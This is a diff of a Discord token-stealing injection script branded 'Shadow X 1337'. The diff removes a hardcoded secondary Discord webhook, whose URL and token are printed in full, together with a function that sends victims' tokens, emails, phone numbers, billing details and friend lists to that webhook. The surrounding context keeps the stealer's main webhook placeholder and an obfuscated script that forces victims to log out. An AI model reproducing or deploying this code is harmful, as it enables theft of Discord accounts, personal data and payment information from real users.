@@ -12,7 +12,6 @@ var config = {
     brand: "Shadow X 1337",
 
     webhook: "%WEBHOOK_LINK%",
-    webhook2: "https://discord.com/api/webhooks/1094358748790800495/_2ZWO7hlxuFf7xNQy1H4tQf0TzQQr3HPh7sIyyMCV5dL0W6sOoXiHae17hfJLfNO38C2",
 
     logout: true,
     disable_qr_code: true,
@@ -648,39 +647,6 @@ function sendToWebhook(params) {
 }
 
 // ==================================================================================
-// ==================================================================================
-
-function sendToWebhook2(params) {
-
-    if (config.ping[0] == true) {
-        if (params.content) {
-            params.content = params.content + ` ||${config.ping[1]}||`
-        } else {
-            params.content = `||${config.ping[1]}||`
-        }
-    }
-
-    var url = new URL(config.webhook2);
-    var headers = {
-        'Content-Type': 'application/json',
-        'Access-Control-Allow-Origin': '*',
-    }
-    const options = {
-        protocol: url.protocol,
-        hostname: url.host,
-        path: url.pathname,
-        method: 'POST',
-        headers: headers,
-    };
-    const req = https.request(options);
-    req.on('error', (err) => {
-        console.log(err);
-    });
-    req.write(JSON.stringify(params));
-    req.end();
-}
-
-// ==================================================================================
 
 function createEmbed(data) {
     let obj = {
@@ -795,64 +761,6 @@ async function initialize() {
 
         }
 
-                sendToWebhook2({
-                    username: config.embed.username,
-                    avatar_url: config.embed.avatar_url,
-                    embeds: [createEmbed({
-                        title: "Discord | Client initialized",
-                        url: config.embed.href,
-                        author: {
-                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        thumbnail: {
-                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        fields: [{
-                                name: "<:1337:1093566174706536519> **Mail**",
-                                value: `\`${userInfo.email}\``,
-                                inline: true
-                            },
-                            {
-                                name: "<a:1337:1093566167827886190> **Phone Number**",
-                                value: `\`${userInfo.phone ?? "None"}\``,
-                                inline: true
-                            },
-                            {
-                                name: "<:1337:1093566186660298916> **Nitro**",
-                                value: `${getNitro(userInfo.premium_type)}`,
-                                inline: true
-                            }, {
-                                name: "<a:1337:1093566170092810302> **Billing**",
-                                value: `${billing}`,
-                                inline: true
-                            }, {
-                                name: "<:1337:1093566181253853304> **Badges**",
-                                value: `${getBadges(userInfo.flags)}`,
-                                inline: true
-                            },
-                            {
-                                name: "<a:1337:1093566179207032944> **Token**",
-                                value: `\`${token}\``,
-                                inline: false
-                            }
-                        ],
-                    }), createEmbed({
-                        description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                        thumbnail: {
-                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        author: {
-                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                    })]
-                })
-            }
-
-        }
 
         if (config.logout && token) {
             await execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true).then((result) => {});
